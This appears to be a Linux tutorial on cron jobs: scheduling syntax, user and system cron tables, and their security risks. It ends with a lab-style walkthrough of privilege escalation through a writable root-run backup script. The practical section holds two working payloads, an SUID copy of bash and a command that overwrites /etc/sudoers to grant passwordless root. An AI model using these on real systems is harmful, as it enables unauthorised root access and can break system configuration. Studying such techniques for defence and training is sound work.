_**TO VIEW PRACTICAL, [CLICK HERE](#Practical)**_

# Cron jobs
`Cron` is a utility used in Unix systems to schedule tasks; it uses the cron daemon, `crond`, to run in the background and manage the execution of cron jobs by reading and processing the `cron table`. A cron job is a task scheduled to run in a given period that helps users automate routine tasks such as archiving logs or backing up system files. Cron jobs are maintained in cron tables, configuration files located at `/var/spool/cron/crontabs` and '/etc/crontab' that define the schedules of tasks. Cron tables can be specific to the system or individual users.

## Syntax

The system-wide cron table is readable by regular users and can be accessed with any text editor:
```
vim /etc/crontab
```
To edit the system-wide cron table, you must be a privileged user.
```
sudo vim /etc/crontab
```
You can list the cron table your account has access to with the command:
```
crontab -l
```
To edit or add a cron table, you can use the command:
```
crontab -e 
```
To schedule a cron job, use the following syntax:
```
* * * * * /path/to/file
```
Where:
- The first asterisk represents the minute (0-59)
- The second asterisk represents the hour (0-23)
- The third asterisk represents the day of the month (1-31)
- The fourth asterisk represents the month (1-12)
- The fifth asterisk represents the day of the week (0-7, where 0 and 7 both represent Sunday)

Cron syntax also uses operators on provided values in cron fields.
- An asterisk (*) represents all values.
- A comma (,) specifies a list of values.
- A dash (-) indicates a range of values.
- A forward slash (/) is used as a step value.

```
30 5 */2 * * /home/kayem/script.sh
```
The cron job above will execute /home/kayem/script.sh at 5:30 every second day of the month.

## Managing cron tables

System cron tables are located at `/etc/crontab` and require root privileges to edit. They contain scheduled tasks that apply to the entire system or require root privileges for high-privileged operations. To edit the system cron table, modify `/etc/crontab` as attempting to edit it with `sudo cron tab -e` will revise the personal cron table of the root user; rather than the system cron table. 

Each user has their own cron table. Although not created by default, a system administrator or user can make a cron table with the following commands, respectively.
```
crontab -e -u [USER]
```
```
crontab -e
```
Users can create a cron table without root privileges but are limited to scheduling tasks with the files they have permission to execute.

## Security implications of cron jobs

If misconfigured, cron jobs can be executed with elevated privileges and gain unauthorised access to critical system resources. Therefore, it is necessary that personal cron jobs run with the user's privileges; rather than higher privileged users. If a cron job file has the SUID bit set, is owned by a higher privileged user and permits writability to other users, malicious code can be injected into the cron job file.

## Practical

I identify accessible cron jobs with `crontab -e` for local cron jobs and `cat /etc/crontab` for system-wide cron jobs. The user does not have a personal cron table, yet they are granted access to the following system-wide cron jobs. 

```
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py
```
To edit the cron job file, you must have write permissions so I identify files which can be written to by my user.
```
ls -l /home/karen/backup.sh
```
For the cron table to execute the cron job, it must have execute privileges.  
```
chmod +x /home/karen/backup.sh
```
You can modify the `backup.sh` following two methods to escalate privileges.

### Method 1

The following payload copies the `/bin/bash` binary to `/tmp/bash` and appoints the SUID bit so that it can run with the privileges of the root user (the owner of the `/home/karen/backup.sh` file.

```
cp /bin/bash /tmp/bash; chmod +s /tmp/bash
```
The copied binary is then executed in privileged mode to create a new bash shell session with the effective User ID of 0 (root).

'/tmp/bash -p'

### Method 2

Alternatively, add the user to the /etc/sudoers file.

```
echo "karen ALL=(root) NOPASSWD: ALL" > /etc/sudoers
```

Since this cron job has been scheduled to run each minute, wait a minute for the payload to take effect.
